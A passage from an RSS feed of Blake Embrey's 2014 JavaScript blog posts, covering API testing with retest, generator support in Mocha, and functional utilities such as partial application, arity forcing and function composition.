  expect(res.body).to.equal(&lt;span class=&quot;hljs-string&quot;&gt;'{&quot;test&quot;:&quot;data&quot;}'&lt;/span&gt;);
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Even the response body can be parsed. If the response &lt;code&gt;Content-Type&lt;/code&gt; is set to either JSON or URL-encoding, it will be parsed and set as &lt;code&gt;res.body&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Another feature borrowed from supertest is &lt;code&gt;retest.agent&lt;/code&gt;. Using the agent function returns an instance of request that is using a single cookie jar. This lets cookies persist between API requests.&lt;/p&gt;
&lt;h2 id=&quot;why-remove-chaining-and-assertions-&quot;&gt;Why Remove Chaining and Assertions?&lt;/h2&gt;
&lt;p&gt;The reason behind removing the chaining syntax is a result of my recent work with generator functions. Once I started writing my code using generators, I found it disconnecting to writing my tests using callbacks. So I implemented &lt;a href=&quot;https://github.com/blakeembrey/co-retest&quot;&gt;co-retest&lt;/a&gt; which returns thunks. Combine this with &lt;a href=&quot;https://github.com/blakeembrey/co-mocha&quot;&gt;co-mocha&lt;/a&gt; and now we can write a really elegant API test suite.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;it(&lt;span class=&quot;hljs-string&quot;&gt;'should respond with &quot;success&quot;'&lt;/span&gt;, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;* (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; res = &lt;span class=&quot;hljs-keyword&quot;&gt;yield&lt;/span&gt; request(&lt;span class=&quot;hljs-string&quot;&gt;'/'&lt;/span&gt;);

  expect(res.statusCode).to.equal(&lt;span class=&quot;hljs-number&quot;&gt;200&lt;/span&gt;);
  expect(res.body).to.equal(&lt;span class=&quot;hljs-string&quot;&gt;'success'&lt;/span&gt;);
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It&amp;#39;s important to note that generators are only available in node 0.11 and needs to be enabled using the &lt;code&gt;--harmony-generators&lt;/code&gt; flag.&lt;/p&gt;
</description></item><item><title>Enabling Generators in Mocha</title><link>http://blakeembrey.com/articles/2014/02/mocha-test-harmony-generators</link><pubDate>Mon, 03 Feb 2014 12:30:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/02/mocha-test-harmony-generators</guid><author>Blake Embrey</author><description>&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; It&amp;#39;s on &lt;a href=&quot;http://npmjs.org/package/co-mocha&quot;&gt;npm&lt;/a&gt;. Just &lt;code&gt;npm install co-mocha&lt;/code&gt; and &lt;code&gt;--require co-mocha&lt;/code&gt; in your mocha script to test using generators.&lt;/p&gt;
&lt;p&gt;For the last week, I&amp;#39;ve been working on a new project that uses node 0.11 and generators. Aside from the numerous benefits with generators in the application, I also integrated generators into my test suite. By using &lt;a href=&quot;http://visionmedia.github.io/mocha/&quot;&gt;mocha&lt;/a&gt; and &lt;a href=&quot;https://github.com/visionmedia/co&quot;&gt;co&lt;/a&gt;, you can also enable support for generator functions in your test suite.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; co       = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'co'&lt;/span&gt;);
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; mocha    = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'mocha'&lt;/span&gt;);
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; Runnable = mocha.Runnable;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; run      = Runnable.prototype.run;

&lt;span class=&quot;hljs-comment&quot;&gt;/**
 * Override the Mocha function runner and enable generator support with co.
 *
 * @param {Function} fn
 */&lt;/span&gt;
Runnable.prototype.run = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;fn&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.fn.constructor.name === &lt;span class=&quot;hljs-string&quot;&gt;'GeneratorFunction'&lt;/span&gt;) {
    &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.fn   = co(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.fn);
    &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.sync = !(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.async = &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);
  }

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; run.call(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, fn);
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Save the snippet of code above into a JavaScript file and pass the filename to &lt;code&gt;mocha.opts&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mocha --harmony-generators --require test/support/co-mocha
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Writing tests using generators has made testing even more enjoyable, so I decided to release the &lt;a href=&quot;https://github.com/blakeembrey/co-mocha&quot;&gt;code on Github&lt;/a&gt; with some accompanying tests and test coverage.&lt;/p&gt;
</description></item><item><title>Partial Application in JavaScript</title><link>http://blakeembrey.com/articles/2014/01/partial-application-in-javascript</link><pubDate>Sat, 25 Jan 2014 23:00:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/01/partial-application-in-javascript</guid><author>Blake Embrey</author><description>&lt;p&gt;Partial application is the act of pre-filling arguments of a function and returning a new function of smaller arity. The returned function can be called with additional parameters and in JavaScript, the &lt;code&gt;this&lt;/code&gt; context can also be changed when called. Using a partially applied function is extremely common in functional programming with JavaScript as it allows us to compose some really nifty utilities and avoid repeating ourselves in code.&lt;/p&gt;
&lt;p&gt;In modern JavaScript engines, there is a &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/bind&quot;&gt;bind function&lt;/a&gt; which can be used to achieve a similar result. The difference between &lt;code&gt;partial&lt;/code&gt; and &lt;code&gt;bind&lt;/code&gt; is that the a partial functions &lt;code&gt;this&lt;/code&gt; context is set when the returned function is called, while a bound functions &lt;code&gt;this&lt;/code&gt; context has already been defined and can&amp;#39;t be changed.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;

&lt;span class=&quot;hljs-comment&quot;&gt;/**
 * Wrap a function with default arguments for partial application.
 *
 * @param  {Function} fn
 * @param  {*}        ...
 * @return {Function}
 */&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; partial = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;fn &lt;span class=&quot;hljs-comment&quot;&gt;/*, ...args */&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; args = __slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, args.concat(__slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;)));
  };
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;From the function above, we can understand that &lt;code&gt;partial&lt;/code&gt; accepts the function to be pre-filled and it&amp;#39;s default arguments. It then returns a new function which can be called with some more arguments. It&amp;#39;s important to note that the context (&lt;code&gt;this&lt;/code&gt;) is being defined when the returned function is called. But when would you even want to use this?&lt;/p&gt;
&lt;p&gt;Normally I would be happy to give a simple example of transforming an &lt;code&gt;add&lt;/code&gt; function into an &lt;code&gt;add5&lt;/code&gt; by partially applying it - &lt;code&gt;partial(add, 5)&lt;/code&gt;. This definitely demonstates how we can use the utility, but doesn&amp;#39;t really touch on why.&lt;/p&gt;
&lt;p&gt;Consider writing a logging utility that accepts some different arguments that need to be logged - &lt;code&gt;var log = function (type, value) {}&lt;/code&gt;. Fantastic, it looks like a really simple function to use. But now we want set every log in our file to the &lt;code&gt;testing&lt;/code&gt; type. We can do a couple of things to achieve this. One option would be to assign our type to a variable and reuse the variable  - &lt;code&gt;var testType = &amp;#39;Testing&amp;#39;&lt;/code&gt; and &lt;code&gt;log(testType, value)&lt;/code&gt;. This will get messy after we write it more than once. What if we just wrapped the &lt;code&gt;log&lt;/code&gt; function automatically?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; testLog = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; log.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, [&lt;span class=&quot;hljs-string&quot;&gt;'testing'&lt;/span&gt;].concat(__slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;)));
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Great, this looks familiar - we could have just used partial - &lt;code&gt;var testLog = partial(log, &amp;#39;Testing&amp;#39;)&lt;/code&gt;. Now we have a function we can continue to reuse any number of times without fear of repeating ourselves.&lt;/p&gt;
&lt;h2 id=&quot;bonus-points&quot;&gt;Bonus Points&lt;/h2&gt;
&lt;p&gt;If you&amp;#39;ve been reading any of my previous blog posts, you may have noticed me abusing the usefulness of &lt;a href=&quot;http://blakeembrey.com/articles/forcing-function-arity-in-javascript/&quot;&gt;function arity&lt;/a&gt; in anonymously returned functions. And in another article I wrote about a utility that can help us remove the &lt;a href=&quot;http://blakeembrey.com/articles/javascript-variadic-function/&quot;&gt;repetitive argument slicing&lt;/a&gt;. If you haven&amp;#39;t checked out these utilities yet, take a quick look and I bet you&amp;#39;ll see how we could use them here.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; partial = variadic(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;fn, args&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; remaining = &lt;span class=&quot;hljs-built_in&quot;&gt;Math&lt;/span&gt;.max(fn.length - args.length, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;);

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; arity(remaining, variadic(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;called&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, args.concat(called));
  }));
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now the returned partially applied function gives us the correct number of trailing arguments still to be filled using the &lt;code&gt;arity&lt;/code&gt; utility. On top of that, we managed to get rid of slicing arguments constantly by using the &lt;code&gt;variadic&lt;/code&gt; utility. In fact, I&amp;#39;ve been so interested in these reusable utilities that I published the &lt;a href=&quot;https://github.com/blakeembrey/partial&quot;&gt;partial utility on Github&lt;/a&gt; so I can reuse it later.&lt;/p&gt;
</description></item><item><title>Forcing Function Arity in JavaScript</title><link>http://blakeembrey.com/articles/2014/01/forcing-function-arity-in-javascript</link><pubDate>Wed, 22 Jan 2014 23:30:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/01/forcing-function-arity-in-javascript</guid><author>Blake Embrey</author><description>&lt;p&gt;Function arity in something in JavaScript that is usually overlooked. For the most part, that&amp;#39;s perfectly understandable, it&amp;#39;s just a number. Unfortunately, this number can be integral to many other functions working correctly. But first, what number am I talking about?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; fn = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;a, b&lt;/span&gt;) &lt;/span&gt;{};

fn.length; &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; 2&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As you can see, the length gives up the exact number of arguments the function is expecting to be passed in. This can be useful for other functions that might want to alter its behaviour based on this digit. For example, I found outlining this issue &lt;a href=&quot;http://raganwald.com/2013/03/21/arity-and-partial-function-application.html&quot;&gt;with currying&lt;/a&gt;. Basically, the &lt;code&gt;curry&lt;/code&gt; function implementation relies on using the arity information to know how many times the function needs to be curried.&lt;/p&gt;
&lt;p&gt;To force the number of arity in our returned anonymous functions, we need to dynamically generate a function with the specified number of arguments. Why? Because the previous implementations of &lt;a href=&quot;http://blakeembrey.com/articles/wrapping-javascript-functions/&quot;&gt;wrapping functions&lt;/a&gt;, &lt;a href=&quot;http://blakeembrey.com/articles/javascript-bind-function/&quot;&gt;bind&lt;/a&gt;, &lt;a href=&quot;http://blakeembrey.com/articles/javascript-variadic-function/&quot;&gt;variadic&lt;/a&gt; and every other functional utility I have demonstrated don&amp;#39;t proxy the number of arguments through the returned function.&lt;/p&gt;
&lt;p&gt;This can be a problem in the case where we want to use this function somewhere that expects a function length to work correctly, like when currying. We could fix this at the source, a half a dozen times and any number of times more. Or we could write a little utility that will enfore a number of arguments for us.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; names   = &lt;span class=&quot;hljs-string&quot;&gt;'abcdefghijklmnopqrstuvwxyz'&lt;/span&gt;;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;

&lt;span class=&quot;hljs-comment&quot;&gt;/**
 * Make a function appear as though it accepts a certain number of arguments.
 *
 * @param  {Number}   length
 * @param  {Function} fn
 * @return {Function}
 */&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; arity = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;length, fn&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;eval&lt;/span&gt;(
    &lt;span class=&quot;hljs-string&quot;&gt;'(function ('&lt;/span&gt; + __slice.call(names, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, length).join(&lt;span class=&quot;hljs-string&quot;&gt;','&lt;/span&gt;) + &lt;span class=&quot;hljs-string&quot;&gt;') {\n'&lt;/span&gt; +
    &lt;span class=&quot;hljs-string&quot;&gt;'return fn.apply(this, arguments);\n'&lt;/span&gt; +
    &lt;span class=&quot;hljs-string&quot;&gt;'})'&lt;/span&gt;
  );
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The above function allows us to pass in an argument length and a function to proxy. It then returns to us an anonymous function with the correct number of arguments defined (&lt;code&gt;.length&lt;/code&gt; works!) and allows us to call the function and return the usual result. It doesn&amp;#39;t do anything to the arguments in the interim, it just tells the world how many arguments we are accepting.&lt;/p&gt;
&lt;h2 id=&quot;the-other-arity-problem&quot;&gt;The Other Arity Problem&lt;/h2&gt;
&lt;p&gt;So we&amp;#39;ve touched one of the arity problems, which is a expecting to read the correct arity from a function. The reverse arity problem is when a function is called with incorrect or overloaded arguments. Consider &lt;code&gt;parseInt&lt;/code&gt;, which accepts two arguments - a string and the radix.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;].map(&lt;span class=&quot;hljs-built_in&quot;&gt;parseInt&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; [1, NaN, NaN, NaN, NaN]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we&amp;#39;re having problems. To fix this we can make a utility function that limits the number of arguments passed through.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;

&lt;span class=&quot;hljs-comment&quot;&gt;/**
 * Force a function to accept a specific number of arguments.
 *
 * @param  {Number}   length
 * @param  {Function} fn
 * @return {Function}
 */&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; nary = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;length, fn&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, __slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, length));
  };
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If you&amp;#39;ve been reading, you would have just noticed that we introduced the original bug we&amp;#39;ve been trying to avoid. That is, we&amp;#39;re returning a new anonymous function without proxying the number of arguments through. Let&amp;#39;s quickly correct that with the function we just wrote.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;

&lt;span class=&quot;hljs-comment&quot;&gt;/**
 * Force a function to accept a specific number of arguments.
 *
 * @param  {Number}   length
 * @param  {Function} fn
 * @return {Function}
 */&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; nary = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;length, fn&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-comment&quot;&gt;// Uses the previous function to proxy the number of arguments.&lt;/span&gt;
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; arity(length, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, __slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, length));
  });
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we can use this to fix our map error from earlier. We also have the added bonus of a correct argument representation.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;nary(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;parseInt&lt;/span&gt;).length; &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; 1&lt;/span&gt;

[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;].map(nary(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;parseInt&lt;/span&gt;)); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; [1, 2, 3, 4, 5]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
</description></item><item><title>Composing Functions in JavaScript</title><link>http://blakeembrey.com/articles/2014/01/compose-functions-javascript</link><pubDate>Sun, 19 Jan 2014 00:00:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/01/compose-functions-javascript</guid><author>Blake Embrey</author><description>&lt;p&gt;Composing multiple functions to create more complex ones is a common utility in any programming language. And the ability to construct functions in a way that is easily composable is a true talent, but it really shines with code maintenance and reuse. It&amp;#39;s not uncommon to find huge applications composed of many, much smaller functions. Inspired by this pattern of extremely modular functions, I&amp;#39;ve been slowly migrating my programming style to allow for more composable and reusable functions.&lt;/p&gt;
&lt;p&gt;To compose functions together, we will need to accept a list of functions for it to be made up from. Let&amp;#39;s call the functions &lt;code&gt;a&lt;/code&gt;, &lt;code&gt;b&lt;/code&gt; and &lt;code&gt;c&lt;/code&gt;. Now that we have the list of functions, we need to call each of them with the result of the next function. In JavaScript, we would do this with &lt;code&gt;a(b(c(x)))&lt;/code&gt; - with &lt;code&gt;x&lt;/code&gt; being the starting value. However, it would be much more useful to have something a little more reusable than this.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; compose = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; fns = &lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;;

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;result&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i = fns.length - &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;; i &amp;gt; -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;; i--) {
      result = fns[i].call(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, result);
    }

    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;
  };
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The above function iterates over the function list (our arguments) in reverse - the last function to pass in is executed first. Given a single value as the initial input, it&amp;#39;ll chain that value between every function call and return the final result. This allows us to do some really cool things.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; number = compose(&lt;span class=&quot;hljs-built_in&quot;&gt;Math&lt;/span&gt;.round, &lt;span class=&quot;hljs-built_in&quot;&gt;parseFloat&lt;/span&gt;);

number(&lt;span class=&quot;hljs-string&quot;&gt;'72.5'&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; 73&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;sequence&quot;&gt;Sequence&lt;/h2&gt;
&lt;p&gt;Another utility I&amp;#39;ve seen about in some functional libraries is called &lt;a href=&quot;https://github.com/raganwald/allong.es#functional-composition&quot;&gt;sequence&lt;/a&gt;. It&amp;#39;s very similar to &lt;code&gt;compose&lt;/code&gt;, except the arguments are executed in reverse. For example:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; sequence = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; fns = &lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;;

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;result&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; i &amp;lt; fns.length; i++) {
      result = fns[i].call(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, result);
    }

    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;
  };
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;However, we should make a note of the almost identical function signature to &lt;code&gt;compose&lt;/code&gt;. Usually, seeing something like this should trigger a warning in your head to find some way to reuse previous functionality, instead of replicating it. In this example, we can reuse the &lt;code&gt;compose&lt;/code&gt; function to write the &lt;code&gt;sequence&lt;/code&gt; implementation.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;hljs-built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; sequence = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; compose.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, __slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;).reverse());
};
&lt;/code&gt;&lt;/pre&gt;
</description></item><item><title>Wrapping JavaScript Functions</title><link>http://blakeembrey.com/articles/2014/01/wrapping-javascript-functions</link><pubDate>Mon, 13 Jan 2014 23:00:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/01/wrapping-javascript-functions</guid><author>Blake Embrey</author><description>&lt;p&gt;In the modern age of web applications and development, it seems we are constantly adding side effects to every part of our applications - everything from analytics to event triggering. Unfortunately in a lot of cases, we tend to cram this functionality into function with the useful stuff. As programmers, this causes numerous issues down the line - especially when it comes to refactoring and code comprehensibility.&lt;/p&gt;
&lt;p&gt;A simple way to keep this functionality apart from the core code is create a helpful utility function to manage it for you. And to keep our code readability, we shouldn&amp;#39;t allow anything advanced that can break our understanding of the original function. That means we don&amp;#39;t want to be able to alter the original function, but we can still trigger any side effects we need to inline with the original function.&lt;/p&gt;
